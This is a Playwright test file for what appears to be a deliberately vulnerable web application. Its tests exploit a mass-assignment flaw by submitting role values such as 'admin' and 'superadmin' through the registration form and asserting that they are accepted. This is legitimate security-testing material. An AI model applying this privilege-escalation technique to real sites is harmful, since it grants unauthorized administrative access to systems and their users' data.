const { test, expect } = require('@playwright/test');

test.describe('/#/ (Mass Assignment via Registration Form)', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('/');
  });

  test('should register as admin via role field', async ({ page }) => {
    const username = `admin_${Date.now()}`;
    
    await page.fill('#regUsername', username);
    await page.fill('#regPassword', 'hacked123');
    await page.fill('#regEmail', `${username}@evil.com`);
    await page.fill('#regRole', 'admin');
    
    await page.click('#registerForm button[type="submit"]');
    await page.waitForSelector('#registerResult.show', { timeout: 5000 });
    
    const resultText = await page.locator('#registerResult').textContent();
    expect(resultText).toContain('success');
    expect(resultText).toContain('admin');
    
    console.log('✓ Mass assignment - Registered as admin via UI');
  });

  test('should escalate privileges to superadmin', async ({ page }) => {
    const username = `superadmin_${Date.now()}`;
    
    await page.fill('#regUsername', username);
    await page.fill('#regPassword', 'test123');
    await page.fill('#regEmail', `${username}@test.com`);
    await page.fill('#regRole', 'superadmin');
    
    await page.click('#registerForm button[type="submit"]');
    await page.waitForSelector('#registerResult.show', { timeout: 5000 });
    
    const resultText = await page.locator('#registerResult').textContent();
    expect(resultText).toContain('success');
    
    console.log('✓ Mass assignment - Registered as superadmin via UI');
  });

  test('should register with custom role value', async ({ page }) => {
    const username = `moderator_${Date.now()}`;
    
    await page.fill('#regUsername', username);
    await page.fill('#regPassword', 'password');
    await page.fill('#regEmail', `${username}@demo.com`);
    await page.fill('#regRole', 'moderator');
    
    await page.click('#registerForm button[type="submit"]');
    await page.waitForSelector('#registerResult.show', { timeout: 5000 });
    
    const resultHTML = await page.locator('#registerResult').innerHTML();
    expect(resultHTML).toContain('userId');
    
    console.log('✓ Mass assignment - Custom role accepted via UI');
  });

  test('should display assigned role in response', async ({ page }) => {
    const username = `role_test_${Date.now()}`;
    
    await page.fill('#regUsername', username);
    await page.fill('#regPassword', 'test');
    await page.fill('#regEmail', `${username}@test.com`);
    await page.fill('#regRole', 'admin');
    
    await page.click('#registerForm button[type="submit"]');
    await page.waitForSelector('#registerResult.show', { timeout: 5000 });
    
    const resultText = await page.locator('#registerResult').textContent();
    expect(resultText).toContain('role');
    expect(resultText).toContain('admin');
    
    console.log('✓ Mass assignment - Assigned role visible in UI response');
  });
});
